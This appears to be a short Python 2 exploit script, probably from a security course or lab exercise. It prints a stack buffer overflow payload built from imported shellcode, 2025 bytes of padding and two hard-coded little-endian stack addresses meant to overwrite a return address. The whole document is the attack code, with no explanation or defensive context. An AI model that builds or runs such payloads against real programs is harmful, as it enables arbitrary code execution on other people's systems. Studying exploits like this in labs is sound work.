from shellcode import shellcode
from struct import pack

print shellcode + '\x61'*2025 + pack('<II', 0xbffee338, 0xbffeeb4c)
